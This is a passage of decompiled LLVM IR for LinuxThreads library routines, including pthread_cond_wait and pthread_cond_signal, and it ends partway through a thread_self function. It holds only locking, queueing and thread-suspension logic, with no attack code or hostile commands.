dec_label_pc_804e797:                             ; preds = %dec_label_pc_804e75e
  store i32 1, i32* @ebx, align 4
  %v1_804e7a0 = add i32 %v2_804e72f, 64
  %v2_804e7a0 = inttoptr i32 %v1_804e7a0 to i8*
  %v3_804e7a0 = load i8, i8* %v2_804e7a0, align 1
  %v4_804e7a0 = icmp eq i8 %v3_804e7a0, 0
  br i1 %v4_804e7a0, label %dec_label_pc_804e7b4, label %dec_label_pc_804e7a6

dec_label_pc_804e7a6:                             ; preds = %dec_label_pc_804e797, %dec_label_pc_804e75e
  store i32 %v2_804e72f, i32* @edx, align 4
  %v0_804e7af = call i32 @enqueue.9()
  br label %dec_label_pc_804e7b4

dec_label_pc_804e7b4:                             ; preds = %dec_label_pc_804e797, %dec_label_pc_804e7a6
  %v0_804e7b7 = load i32, i32* @esi, align 4
  store i32 %v0_804e7b7, i32* %stack_var_-60, align 4
  %v1_804e7b8 = inttoptr i32 %v0_804e7b7 to i32*
  %v2_804e7b8 = call i32 @__pthread_unlock(i32* %v1_804e7b8)
  %v0_804e7c0 = load i32, i32* @ebx, align 4
  %v1_804e7c0 = icmp eq i32 %v0_804e7c0, 0
  br i1 %v1_804e7c0, label %dec_label_pc_804e7d6, label %dec_label_pc_804e7c4

dec_label_pc_804e7c4:                             ; preds = %dec_label_pc_804e7b4
  store i32 %v2_804e72f, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804e7ca = load i32, i32* %stack_var_-60, align 4
  %v1_804e7ca = load i32, i32* %stack_var_-56, align 4
  %v2_804e7ca = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_804e7ca, i32 %v1_804e7ca)
  br label %dec_label_pc_804e88c

dec_label_pc_804e7d6:                             ; preds = %dec_label_pc_804e7b4
  store i32 0, i32* @edi, align 4
  %v0_804e7db = load i32, i32* @ebp, align 4
  store i32 %v0_804e7db, i32* %stack_var_-60, align 4
  %v1_804e7dc = call i32 @pthread_mutex_unlock(i32 %v0_804e7db)
  %v3_804e7ef = inttoptr i32 %arg3 to i32*
  %v1_804e83e = add i32 %v2_804e72f, 440
  %v2_804e83e = inttoptr i32 %v1_804e83e to i8*
  %v1_804e84b = add i32 %v2_804e72f, 64
  %v2_804e84b = inttoptr i32 %v1_804e84b to i8*
  br label %dec_label_pc_804e7e4

dec_label_pc_804e7e4:                             ; preds = %dec_label_pc_804e851, %dec_label_pc_804e7d6
  %v0_804e7e8 = load i32, i32* @edx, align 4
  store i32 %arg3, i32* %stack_var_-56, align 4
  store i32 %v2_804e72f, i32* %stack_var_-60, align 4
  %v4_804e7ef = call i32 @__pthread_timedsuspend_new(i32 %v2_804e72f, i32* %v3_804e7ef, i32 %v0_804e7e8)
  %v1_804e7f7 = icmp eq i32 %v4_804e7ef, 0
  %v1_804e7f9 = icmp eq i1 %v1_804e7f7, false
  br i1 %v1_804e7f9, label %dec_label_pc_804e82d, label %dec_label_pc_804e7fb

dec_label_pc_804e7fb:                             ; preds = %dec_label_pc_804e7e4
  store i32 %v2_804e72f, i32* @edx, align 4
  %v0_804e7ff = load i32, i32* @esi, align 4
  store i32 %v0_804e7ff, i32* @eax, align 4
  %v0_804e801 = load i32, i32* %stack_var_-60, align 4
  %v1_804e801 = call i32 @__pthread_lock(i32 %v0_804e801)
  store i32 %v2_804e72f, i32* @edx, align 4
  %v0_804e80a = load i32, i32* @esi, align 4
  %v1_804e80a = add i32 %v0_804e80a, 8
  store i32 %v1_804e80a, i32* @eax, align 4
  %v0_804e80d = call i32 @remove_from_queue.10()
  %v0_804e815 = load i32, i32* @esi, align 4
  store i32 %v0_804e815, i32* %stack_var_-60, align 4
  store i32 %v0_804e80d, i32* @ebx, align 4
  %v1_804e818 = inttoptr i32 %v0_804e815 to i32*
  %v2_804e818 = call i32 @__pthread_unlock(i32* %v1_804e818)
  %v1_804e820 = icmp eq i32 %v0_804e80d, 0
  %v1_804e822 = icmp eq i1 %v1_804e820, false
  br i1 %v1_804e822, label %dec_label_pc_804e898, label %dec_label_pc_804e824

dec_label_pc_804e824:                             ; preds = %dec_label_pc_804e7fb
  store i32 %v2_804e72f, i32* @eax, align 4
  %v0_804e828 = call i32 @suspend.14()
  br label %dec_label_pc_804e82d

dec_label_pc_804e82d:                             ; preds = %dec_label_pc_804e7e4, %dec_label_pc_804e824
  %v3_804e831 = load i8, i8* %v2_804e772, align 1
  %v4_804e831 = icmp eq i8 %v3_804e831, 0
  %v1_804e838 = icmp eq i1 %v4_804e831, false
  br i1 %v1_804e838, label %dec_label_pc_804e854, label %dec_label_pc_804e83a

dec_label_pc_804e83a:                             ; preds = %dec_label_pc_804e82d
  %v3_804e83e = load i8, i8* %v2_804e83e, align 1
  %v4_804e83e = icmp eq i8 %v3_804e83e, 0
  br i1 %v4_804e83e, label %dec_label_pc_804e851, label %dec_label_pc_804e847

dec_label_pc_804e847:                             ; preds = %dec_label_pc_804e83a
  %v3_804e84b = load i8, i8* %v2_804e84b, align 1
  %v4_804e84b = icmp eq i8 %v3_804e84b, 0
  br i1 %v4_804e84b, label %dec_label_pc_804e854, label %dec_label_pc_804e851

dec_label_pc_804e851:                             ; preds = %dec_label_pc_804e847, %dec_label_pc_804e83a
  %v0_804e851 = load i32, i32* @edi, align 4
  %v1_804e851 = add i32 %v0_804e851, 1
  store i32 %v1_804e851, i32* @edi, align 4
  br label %dec_label_pc_804e7e4

dec_label_pc_804e854:                             ; preds = %dec_label_pc_804e847, %dec_label_pc_804e82d
  store i32 %v2_804e72f, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804e85a = load i32, i32* %stack_var_-60, align 4
  %v1_804e85a = load i32, i32* %stack_var_-56, align 4
  %v2_804e85a = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_804e85a, i32 %v1_804e85a)
  %v3_804e863 = load i8, i8* %v2_804e83e, align 1
  %v4_804e863 = icmp eq i8 %v3_804e863, 0
  br i1 %v4_804e863, label %dec_label_pc_804e8bc.preheader, label %dec_label_pc_804e86c

dec_label_pc_804e86c:                             ; preds = %dec_label_pc_804e854
  %v3_804e870 = load i8, i8* %v2_804e84b, align 1
  %v4_804e870 = icmp eq i8 %v3_804e870, 0
  %v1_804e874 = icmp eq i1 %v4_804e870, false
  br i1 %v1_804e874, label %dec_label_pc_804e8bc.preheader, label %dec_label_pc_804e876

dec_label_pc_804e8bc.preheader:                   ; preds = %dec_label_pc_804e854, %dec_label_pc_804e86c
  %v0_804e8bc19 = load i32, i32* @edi, align 4
  %v1_804e8bc20 = add i32 %v0_804e8bc19, -1
  store i32 %v1_804e8bc20, i32* @edi, align 4
  %v10_804e8bd26 = icmp eq i32 %v0_804e8bc19, 0
  %v1_804e8c028 = icmp eq i1 %v10_804e8bd26, false
  br i1 %v1_804e8c028, label %dec_label_pc_804e8b3, label %dec_label_pc_804e8c2

dec_label_pc_804e876:                             ; preds = %dec_label_pc_804e86c
  store i8 0, i8* %v2_804e83e, align 1
  %v0_804e884 = load i32, i32* @ebp, align 4
  store i32 %v0_804e884, i32* %stack_var_-60, align 4
  %v1_804e885 = call i32 @pthread_mutex_lock(i32 %v0_804e884)
  store i32 %v0_804e884, i32* @ecx, align 4
  %v2_804e88b = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_804e88b, i32* @ebx, align 4
  br label %dec_label_pc_804e88c

dec_label_pc_804e88c:                             ; preds = %dec_label_pc_804e7c4, %dec_label_pc_804e876
  store i32 %v4_804e72b, i32* %stack_var_-56, align 4
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_804e893 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804e72b)
  br label %dec_label_pc_804e898

dec_label_pc_804e898:                             ; preds = %dec_label_pc_804e7fb, %dec_label_pc_804e88c
  store i32 %v2_804e72f, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804e89e = load i32, i32* %stack_var_-60, align 4
  %v1_804e89e = load i32, i32* %stack_var_-56, align 4
  %v2_804e89e = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_804e89e, i32 %v1_804e89e)
  %v0_804e8a6 = load i32, i32* @ebp, align 4
  store i32 %v0_804e8a6, i32* %stack_var_-60, align 4
  %v1_804e8a7 = call i32 @pthread_mutex_lock(i32 %v0_804e8a6)
  br label %dec_label_pc_804e8cd

dec_label_pc_804e8b3:                             ; preds = %dec_label_pc_804e8bc.preheader, %dec_label_pc_804e8b3
  store i32 %v2_804e72f, i32* @eax, align 4
  %v0_804e8b7 = call i32 @restart.12()
  %v0_804e8bc = load i32, i32* @edi, align 4
  %v1_804e8bc = add i32 %v0_804e8bc, -1
  store i32 %v1_804e8bc, i32* @edi, align 4
  %v10_804e8bd = icmp eq i32 %v0_804e8bc, 0
  %v1_804e8c0 = icmp eq i1 %v10_804e8bd, false
  br i1 %v1_804e8c0, label %dec_label_pc_804e8b3, label %dec_label_pc_804e8c2

dec_label_pc_804e8c2:                             ; preds = %dec_label_pc_804e8b3, %dec_label_pc_804e8bc.preheader
  %v0_804e8c5 = load i32, i32* @ebp, align 4
  store i32 %v0_804e8c5, i32* %stack_var_-60, align 4
  %v1_804e8c6 = call i32 @pthread_mutex_lock(i32 %v0_804e8c5)
  br label %dec_label_pc_804e8cd

dec_label_pc_804e8cd:                             ; preds = %dec_label_pc_804e898, %dec_label_pc_804e8c2
  %storemerge1 = phi i32 [ 110, %dec_label_pc_804e898 ], [ 0, %dec_label_pc_804e8c2 ]
  br label %dec_label_pc_804e8d0

dec_label_pc_804e8d0:                             ; preds = %dec_label_pc_804e74c.dec_label_pc_804e8d0_crit_edge, %dec_label_pc_804e8cd
  %v0_804e8d3 = phi i32 [ 22, %dec_label_pc_804e74c.dec_label_pc_804e8d0_crit_edge ], [ %storemerge1, %dec_label_pc_804e8cd ]
  ret i32 %v0_804e8d3

; uselistorder directives
  uselistorder i32 %v0_804e80d, { 1, 0 }
  uselistorder i32 %v3_804e740, { 1, 0 }
  uselistorder i32 %v2_804e72f, { 11, 10, 12, 5, 6, 7, 2, 1, 8, 9, 4, 13, 3, 14, 15, 16, 17, 0 }
  uselistorder i32 %v4_804e72b, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 4, 2, 5, 0 }
  uselistorder i32* %stack_var_-60, { 4, 5, 1, 6, 7, 2, 8, 3, 9, 10, 0, 11 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e8d0, { 1, 0 }
  uselistorder label %dec_label_pc_804e8cd, { 1, 0 }
  uselistorder label %dec_label_pc_804e8b3, { 1, 0 }
  uselistorder label %dec_label_pc_804e898, { 1, 0 }
  uselistorder label %dec_label_pc_804e88c, { 1, 0 }
  uselistorder label %dec_label_pc_804e8bc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804e82d, { 1, 0 }
  uselistorder label %dec_label_pc_804e7b4, { 1, 0 }
}

define i32 @__GI_pthread_cond_wait(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e8dd = load i32, i32* @edi, align 4
  %v0_804e8de = load i32, i32* @esi, align 4
  %v0_804e8df = load i32, i32* @ebx, align 4
  store i32 %v0_804e8df, i32* %stack_var_-16, align 4
  %v4_804e8df = ptrtoint i32* %stack_var_-16 to i32
  %v2_804e8e3 = call i32 @thread_self.13(i32 %v0_804e8df, i32 %v0_804e8de)
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804e8f1 = add i32 %arg2, 12
  %v2_804e8f1 = inttoptr i32 %v1_804e8f1 to i32*
  %v3_804e8f1 = load i32, i32* %v2_804e8f1, align 4
  %v9_804e8f4 = icmp eq i32 %v3_804e8f1, 3
  br i1 %v9_804e8f4, label %dec_label_pc_804e90e, label %dec_label_pc_804e8f9

dec_label_pc_804e8f9:                             ; preds = %entry
  %v1_804e8f9 = icmp eq i32 %v3_804e8f1, 0
  br i1 %v1_804e8f9, label %dec_label_pc_804e90e, label %dec_label_pc_804e8fd

dec_label_pc_804e8fd:                             ; preds = %dec_label_pc_804e8f9
  %v1_804e905 = add i32 %arg2, 8
  %v2_804e905 = inttoptr i32 %v1_804e905 to i32*
  %v3_804e905 = load i32, i32* %v2_804e905, align 4
  %v15_804e905 = icmp eq i32 %v3_804e905, %v2_804e8e3
  %v1_804e908 = icmp eq i1 %v15_804e905, false
  br i1 %v1_804e908, label %dec_label_pc_804ea0e, label %dec_label_pc_804e90e

dec_label_pc_804e90e:                             ; preds = %dec_label_pc_804e8fd, %dec_label_pc_804e8f9, %entry
  %v2_804e911 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804e911, i32* @edx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v1_804e91e = add i32 %v2_804e8e3, 441
  %v2_804e91e = inttoptr i32 %v1_804e91e to i8*
  store i8 0, i8* %v2_804e91e, align 1
  store i32 %v2_804e8e3, i32* @eax, align 4
  %v0_804e928 = load i32, i32* %stack_var_-28, align 4
  %v2_804e928 = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_804e928, i32 134538975)
  store i32 %v2_804e8e3, i32* @edx, align 4
  %v0_804e930 = load i32, i32* @esi, align 4
  store i32 %v0_804e930, i32* @eax, align 4
  %v1_804e932 = call i32 @__pthread_lock(i32 134538975)
  %v1_804e93a = add i32 %v2_804e8e3, 66
  %v2_804e93a = inttoptr i32 %v1_804e93a to i8*
  %v3_804e93a = load i8, i8* %v2_804e93a, align 1
  %v4_804e93a = icmp eq i8 %v3_804e93a, 0
  br i1 %v4_804e93a, label %dec_label_pc_804e94e, label %dec_label_pc_804e940

dec_label_pc_804e940:                             ; preds = %dec_label_pc_804e90e
  store i32 1, i32* @ebx, align 4
  %v1_804e948 = add i32 %v2_804e8e3, 64
  %v2_804e948 = inttoptr i32 %v1_804e948 to i8*
  %v3_804e948 = load i8, i8* %v2_804e948, align 1
  %v4_804e948 = icmp eq i8 %v3_804e948, 0
  br i1 %v4_804e948, label %dec_label_pc_804e95b, label %dec_label_pc_804e94e

dec_label_pc_804e94e:                             ; preds = %dec_label_pc_804e940, %dec_label_pc_804e90e
  store i32 %v2_804e8e3, i32* @edx, align 4
  %v0_804e956 = call i32 @enqueue.9()
  br label %dec_label_pc_804e95b

dec_label_pc_804e95b:                             ; preds = %dec_label_pc_804e940, %dec_label_pc_804e94e
  %v0_804e95e = load i32, i32* @esi, align 4
  store i32 %v0_804e95e, i32* %stack_var_-60, align 4
  %v1_804e95f = inttoptr i32 %v0_804e95e to i32*
  %v2_804e95f = call i32 @__pthread_unlock(i32* %v1_804e95f)
  %v0_804e967 = load i32, i32* @ebx, align 4
  %v1_804e967 = icmp eq i32 %v0_804e967, 0
  br i1 %v1_804e967, label %dec_label_pc_804e979, label %dec_label_pc_804e96b

dec_label_pc_804e96b:                             ; preds = %dec_label_pc_804e95b
  store i32 %v2_804e8e3, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804e970 = load i32, i32* %stack_var_-60, align 4
  %v1_804e970 = load i32, i32* %stack_var_-56, align 4
  %v2_804e970 = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_804e970, i32 %v1_804e970)
  br label %dec_label_pc_804e9e7

dec_label_pc_804e979:                             ; preds = %dec_label_pc_804e95b
  store i32 0, i32* @ebx, align 4
  %v0_804e97e = load i32, i32* @edi, align 4
  store i32 %v0_804e97e, i32* %stack_var_-60, align 4
  %v1_804e97f = call i32 @pthread_mutex_unlock(i32 %v0_804e97e)
  %v1_804e99e = add i32 %v2_804e8e3, 440
  %v2_804e99e = inttoptr i32 %v1_804e99e to i8*
  %v1_804e9aa = add i32 %v2_804e8e3, 64
  %v2_804e9aa = inttoptr i32 %v1_804e9aa to i8*
  store i32 %v2_804e8e3, i32* @eax, align 4
  %v0_804e98a16 = call i32 @suspend.14()
  %v3_804e99217 = load i8, i8* %v2_804e91e, align 1
  %v4_804e99218 = icmp eq i8 %v3_804e99217, 0
  %v1_804e99920 = icmp eq i1 %v4_804e99218, false
  br i1 %v1_804e99920, label %dec_label_pc_804e9b3, label %dec_label_pc_804e99b

dec_label_pc_804e99b:                             ; preds = %dec_label_pc_804e979, %dec_label_pc_804e9b0
  %v3_804e99e = load i8, i8* %v2_804e99e, align 1
  %v4_804e99e = icmp eq i8 %v3_804e99e, 0
  br i1 %v4_804e99e, label %dec_label_pc_804e9b0, label %dec_label_pc_804e9a7

dec_label_pc_804e9a7:                             ; preds = %dec_label_pc_804e99b
  %v3_804e9aa = load i8, i8* %v2_804e9aa, align 1
  %v4_804e9aa = icmp eq i8 %v3_804e9aa, 0
  br i1 %v4_804e9aa, label %dec_label_pc_804e9b3, label %dec_label_pc_804e9b0

dec_label_pc_804e9b0:                             ; preds = %dec_label_pc_804e9a7, %dec_label_pc_804e99b
  %v0_804e9b0 = load i32, i32* @ebx, align 4
  %v1_804e9b0 = add i32 %v0_804e9b0, 1
  store i32 %v1_804e9b0, i32* @ebx, align 4
  store i32 %v2_804e8e3, i32* @eax, align 4
  %v0_804e98a = call i32 @suspend.14()
  %v3_804e992 = load i8, i8* %v2_804e91e, align 1
  %v4_804e992 = icmp eq i8 %v3_804e992, 0
  %v1_804e999 = icmp eq i1 %v4_804e992, false
  br i1 %v1_804e999, label %dec_label_pc_804e9b3, label %dec_label_pc_804e99b

dec_label_pc_804e9b3:                             ; preds = %dec_label_pc_804e9b0, %dec_label_pc_804e9a7, %dec_label_pc_804e979
  store i32 %v2_804e8e3, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804e9b8 = load i32, i32* %stack_var_-60, align 4
  %v1_804e9b8 = load i32, i32* %stack_var_-56, align 4
  %v2_804e9b8 = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_804e9b8, i32 %v1_804e9b8)
  %v3_804e9c0 = load i8, i8* %v2_804e99e, align 1
  %v4_804e9c0 = icmp eq i8 %v3_804e9c0, 0
  br i1 %v4_804e9c0, label %dec_label_pc_804e9fa, label %dec_label_pc_804e9c9

dec_label_pc_804e9c9:                             ; preds = %dec_label_pc_804e9b3
  %v3_804e9cc = load i8, i8* %v2_804e9aa, align 1
  %v4_804e9cc = icmp eq i8 %v3_804e9cc, 0
  %v1_804e9d0 = icmp eq i1 %v4_804e9cc, false
  br i1 %v1_804e9d0, label %dec_label_pc_804e9fa, label %dec_label_pc_804e9d2

dec_label_pc_804e9d2:                             ; preds = %dec_label_pc_804e9c9
  store i8 0, i8* %v2_804e99e, align 1
  %v0_804e9df = load i32, i32* @edi, align 4
  store i32 %v0_804e9df, i32* %stack_var_-60, align 4
  %v1_804e9e0 = call i32 @pthread_mutex_lock(i32 %v0_804e9df)
  store i32 %v0_804e9df, i32* @ebx, align 4
  %v2_804e9e6 = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_804e9e6, i32* @esi, align 4
  br label %dec_label_pc_804e9e7

dec_label_pc_804e9e7:                             ; preds = %dec_label_pc_804e96b, %dec_label_pc_804e9d2
  store i32 %v4_804e8df, i32* %stack_var_-56, align 4
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_804e9ed = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804e8df)
  br label %dec_label_pc_804e9f2

dec_label_pc_804e9f2:                             ; preds = %dec_label_pc_804e9fa, %dec_label_pc_804e9e7
  store i32 %v2_804e8e3, i32* @eax, align 4
  %v0_804e9f5 = call i32 @restart.12()
  br label %dec_label_pc_804e9fa

dec_label_pc_804e9fa:                             ; preds = %dec_label_pc_804e9c9, %dec_label_pc_804e9b3, %dec_label_pc_804e9f2
  %v0_804e9fa = load i32, i32* @ebx, align 4
  %v1_804e9fa = add i32 %v0_804e9fa, -1
  store i32 %v1_804e9fa, i32* @ebx, align 4
  %v10_804e9fb = icmp eq i32 %v0_804e9fa, 0
  %v1_804e9fe = icmp eq i1 %v10_804e9fb, false
  br i1 %v1_804e9fe, label %dec_label_pc_804e9f2, label %dec_label_pc_804ea00

dec_label_pc_804ea00:                             ; preds = %dec_label_pc_804e9fa
  %v0_804ea03 = load i32, i32* @edi, align 4
  store i32 %v0_804ea03, i32* %stack_var_-60, align 4
  %v1_804ea04 = call i32 @pthread_mutex_lock(i32 %v0_804ea03)
  br label %dec_label_pc_804ea0e

dec_label_pc_804ea0e:                             ; preds = %dec_label_pc_804e8fd, %dec_label_pc_804ea00
  %v0_804ea11 = phi i32 [ 22, %dec_label_pc_804e8fd ], [ 0, %dec_label_pc_804ea00 ]
  %v2_804ea13 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ea13, i32* @ebx, align 4
  store i32 %v0_804e8de, i32* @esi, align 4
  store i32 %v0_804e8dd, i32* @edi, align 4
  ret i32 %v0_804ea11

; uselistorder directives
  uselistorder i8* %v2_804e91e, { 1, 0, 2 }
  uselistorder i32 %v3_804e8f1, { 1, 0 }
  uselistorder i32 %v2_804e8e3, { 6, 7, 8, 1, 4, 5, 3, 9, 2, 10, 12, 11, 13, 0 }
  uselistorder i32 %v4_804e8df, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 2, 3, 1, 0 }
  uselistorder i32* %stack_var_-60, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder i32 ()* @suspend.14, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.11, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 134538975, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ea0e, { 1, 0 }
  uselistorder label %dec_label_pc_804e9fa, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e9e7, { 1, 0 }
  uselistorder label %dec_label_pc_804e99b, { 1, 0 }
  uselistorder label %dec_label_pc_804e95b, { 1, 0 }
}

define i32 @pthread_cond_signal(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @edx, align 4
  %v0_804ea1b = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_804ea25 = call i32 @__pthread_lock(i32 %v0_804ea1b)
  %v0_804ea2a = load i32, i32* @esi, align 4
  %v1_804ea2a = add i32 %v0_804ea2a, 8
  %v2_804ea2a = inttoptr i32 %v1_804ea2a to i32*
  %v3_804ea2a = load i32, i32* %v2_804ea2a, align 4
  store i32 %v3_804ea2a, i32* @ebx, align 4
  %v1_804ea2d = icmp eq i32 %v3_804ea2a, 0
  br i1 %v1_804ea2d, label %dec_label_pc_804ea3e, label %dec_label_pc_804ea31

dec_label_pc_804ea31:                             ; preds = %entry
  %v1_804ea31 = add i32 %v3_804ea2a, 8
  %v2_804ea31 = inttoptr i32 %v1_804ea31 to i32*
  %v3_804ea31 = load i32, i32* %v2_804ea31, align 4
  store i32 %v3_804ea31, i32* %v2_804ea2a, align 4
  store i32 0, i32* %v2_804ea31, align 4
  %v0_804ea41.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ea3e

dec_label_pc_804ea3e:                             ; preds = %entry, %dec_label_pc_804ea31
  %v0_804ea41 = phi i32 [ %v0_804ea2a, %entry ], [ %v0_804ea41.pre, %dec_label_pc_804ea31 ]
  %v1_804ea42 = inttoptr i32 %v0_804ea41 to i32*
  %v2_804ea42 = call i32 @__pthread_unlock(i32* %v1_804ea42)
  br i1 %v1_804ea2d, label %dec_label_pc_804ea5c, label %dec_label_pc_804ea4e

dec_label_pc_804ea4e:                             ; preds = %dec_label_pc_804ea3e
  %v1_804ea4e = add i32 %v3_804ea2a, 441
  %v2_804ea4e = inttoptr i32 %v1_804ea4e to i8*
  store i8 1, i8* %v2_804ea4e, align 1
  store i32 %v3_804ea2a, i32* @eax, align 4
  %v0_804ea57 = call i32 @restart.12()
  br label %dec_label_pc_804ea5c

dec_label_pc_804ea5c:                             ; preds = %dec_label_pc_804ea3e, %dec_label_pc_804ea4e
  ret i32 0

; uselistorder directives
  uselistorder i1 %v1_804ea2d, { 1, 0 }
  uselistorder i32 %v3_804ea2a, { 1, 0, 2, 3, 4 }
  uselistorder i32 ()* @restart.12, { 3, 1, 2, 0 }
  uselistorder i32 441, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ea5c, { 1, 0 }
  uselistorder label %dec_label_pc_804ea3e, { 1, 0 }
}

define i32 @__linuxthreads_create_event() local_unnamed_addr {
entry:
  %v0_804ea64 = load i32, i32* @eax, align 4
  ret i32 %v0_804ea64
}

define i32 @__linuxthreads_death_event() local_unnamed_addr {
entry:
  %v0_804ea65 = load i32, i32* @eax, align 4
  ret i32 %v0_804ea65
}

define i32 @__linuxthreads_reap_event() local_unnamed_addr {
entry:
  %v0_804ea66 = load i32, i32* @eax, align 4
  ret i32 %v0_804ea66
}

define i32 @__pthread_set_own_extricate_if.15() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804ea68 = load i32, i32* @esi, align 4
  %v0_804ea69 = load i32, i32* @edx, align 4
  store i32 %v0_804ea69, i32* @esi, align 4
  %v0_804ea6b = load i32, i32* @ebx, align 4
  %v0_804ea6c = load i32, i32* @eax, align 4
  store i32 %v0_804ea6c, i32* @ebx, align 4
  %v1_804ea71 = icmp eq i32 %v0_804ea69, 0
  br i1 %v1_804ea71, label %dec_label_pc_804ea7d, label %dec_label_pc_804ea75

dec_label_pc_804ea75:                             ; preds = %entry
  %v1_804ea75 = add i32 %v0_804ea6c, 64
  %v2_804ea75 = inttoptr i32 %v1_804ea75 to i8*
  %v3_804ea75 = load i8, i8* %v2_804ea75, align 1
  %v4_804ea75 = icmp eq i8 %v3_804ea75, 0
  %v1_804ea79 = icmp eq i1 %v4_804ea75, false
  br i1 %v1_804ea79, label %dec_label_pc_804ea9f, label %dec_label_pc_804ea87

dec_label_pc_804ea7d:                             ; preds = %entry
  %v1_804ea7d = add i32 %v0_804ea6c, 28
  %v2_804ea7d = inttoptr i32 %v1_804ea7d to i32*
  %v3_804ea7d = load i32, i32* %v2_804ea7d, align 4
  store i32 %v3_804ea7d, i32* @eax, align 4
  store i32 %v0_804ea6c, i32* @edx, align 4
  %v1_804ea82 = call i32 @__pthread_lock(i32 %v0_804ea6b)
  %v1_804ea89.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ea87

dec_label_pc_804ea87:                             ; preds = %dec_label_pc_804ea75, %dec_label_pc_804ea7d
  %v1_804ea89 = phi i32 [ %v0_804ea6c, %dec_label_pc_804ea75 ], [ %v1_804ea89.pre, %dec_label_pc_804ea7d ]
  %v2_804ea89 = add i32 %v1_804ea89, 444
  %v3_804ea89 = inttoptr i32 %v2_804ea89 to i32*
  store i32 %v0_804ea69, i32* %v3_804ea89, align 4
  %v1_804ea8f = icmp eq i1 %v1_804ea71, false
  br i1 %v1_804ea8f, label %dec_label_pc_804ea9f, label %dec_label_pc_804ea91

dec_label_pc_804ea91:                             ; preds = %dec_label_pc_804ea87
  %v0_804ea94 = load i32, i32* @ebx, align 4
  %v1_804ea94 = add i32 %v0_804ea94, 28
  %v2_804ea94 = inttoptr i32 %v1_804ea94 to i32*
  %v3_804ea94 = load i32, i32* %v2_804ea94, align 4
  %v1_804ea97 = inttoptr i32 %v3_804ea94 to i32*
  %v2_804ea97 = call i32 @__pthread_unlock(i32* %v1_804ea97)
  br label %dec_label_pc_804ea9f

dec_label_pc_804ea9f:                             ; preds = %dec_label_pc_804ea87, %dec_label_pc_804ea75, %dec_label_pc_804ea91
  %v2_804ea9f = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804ea6b, i32* @ebx, align 4
  store i32 %v0_804ea68, i32* @esi, align 4
  ret i32 %v2_804ea9f

; uselistorder directives
  uselistorder i32 %v0_804ea69, { 1, 0, 2 }
  uselistorder i32 444, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804ea9f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ea87, { 1, 0 }
}

define i32 @thread_self.16(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_804eaa3 = load i32, i32* @esp, align 4
  %v1_804eaa3 = load i32, i32* @global_var_806338c.133, align 4
  %v7_804eaa3 = icmp ult i32 %v0_804eaa3, %v1_804eaa3
  %v1_804eab0 = icmp eq i1 %v7_804eaa3, false
  br i1 %v1_804eab0, label %dec_label_pc_804eae1, label %dec_label_pc_804eab2

dec_label_pc_804eab2:                             ; preds = %entry
  %v1_804eab2 = load i32, i32* @global_var_8063390.134, align 16
  %v7_804eab2 = icmp ult i32 %v0_804eaa3, %v1_804eab2
  br i1 %v7_804eab2, label %dec_label_pc_804eac7, label %dec_label_pc_804eaba

dec_label_pc_804eaba:                             ; preds = %dec_label_pc_804eab2
  %v1_804eaba = load i32, i32* @global_var_8063394.135, align 4
  %v7_804eaba = icmp ult i32 %v0_804eaa3, %v1_804eaba
  br i1 %v7_804eaba, label %dec_label_pc_804eae1, label %dec_label_pc_804eac7

dec_label_pc_804eac7:                             ; preds = %dec_label_pc_804eaba, %dec_label_pc_804eab2
  %v0_804eac7 = load i32, i32* @global_var_80679f0.137, align 16
  %v1_804eac7 = icmp eq i32 %v0_804eac7, 0
  br i1 %v1_804eac7, label %dec_label_pc_804ead5, label %dec_label_pc_804ead0

dec_label_pc_804ead0:                             ; preds = %dec_label_pc_804eac7
  %v0_804ead0 = call i32 @__pthread_find_self()
